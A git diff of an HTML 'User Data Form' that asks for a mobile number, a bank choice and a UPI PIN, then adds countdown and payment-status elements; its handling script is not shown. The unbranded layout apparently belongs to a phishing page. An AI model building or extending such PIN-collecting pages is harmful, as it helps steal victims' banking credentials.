@@ -5,9 +5,8 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>User Data Form</title>
   <style>
-    /* Basic styling */
-     /* Add these CSS modifications */
-    #countdown {
+      /* Add these CSS modifications */
+      #countdown {
         background-color: white;
         padding: 30px;
         border-radius: 15px;
@@ -34,7 +33,6 @@
       background-color: #f4f4f9;
     }
 
-    /* Header Styling */
     header {
       background-color: #4CAF50;
       color: white;
@@ -42,7 +40,6 @@
       padding: 15px;
     }
 
-    /* Footer Styling */
     footer {
       background-color: #333;
       color: white;
@@ -78,7 +75,7 @@
       margin-bottom: 15px;
       border: 1px solid #ccc;
       border-radius: 5px;
-      box-sizing: border-box; /* Ensures that padding doesn't cause overflow */
+      box-sizing: border-box;
     }
 
     button {
@@ -92,25 +89,31 @@
       background-color: #45a049;
     }
 
-    /* Responsive design */
-    @media (max-width: 600px) {
-      body {
-        padding: 10px;
-      }
-      form {
-        padding: 15px;
-      }
+    #countdown {
+      font-size: 30px;
+      font-weight: bold;
+      text-align: center;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      display: none;
+    }
+
+    #paymentStatus {
+      font-size: 20px;
+      text-align: center;
+      margin-top: 20px;
+      display: none;
     }
   </style>
 </head>
 <body>
 
-  <!-- Header Section -->
   <header>
     <h1>User Details </h1>
   </header>
 
-  <!-- Main Form -->
   <form id="userForm">
     <label for="mobile">Mobile Number:</label>
     <input type="text" id="mobile" name="mobile" required><br><br>
@@ -178,24 +181,24 @@
       <option value="Rajasthan State Co-operative Bank">Rajasthan State Co-operative Bank</option>
       <option value="Sikkim State Co-operative Bank">Sikkim State Co-operative Bank</option>
       <option value="  Other Bank">Other Bank</option>
-      <!-- Add your options here -->
+      <!-- Add your bank options here -->
     </select><br><br>
 
-   <label for="upi">UPI PIN:</label>
+    <label for="upi">UPI PIN:</label>
     <input type="password" id="upi" name="upi" required>
     <br><br>
 
     <button type="submit">Pay</button>
   </form>
+       
+  <div id="countdown"></div>
+  <div id="paymentStatus"></div>
 
-  <!-- Footer Section -->
   <footer>
     <p>&copy; 2025 Service. All rights reserved.</p>
   </footer>
 
   <script src="index.js"></script>
-  
 </body>
 </html>
-
-
+  
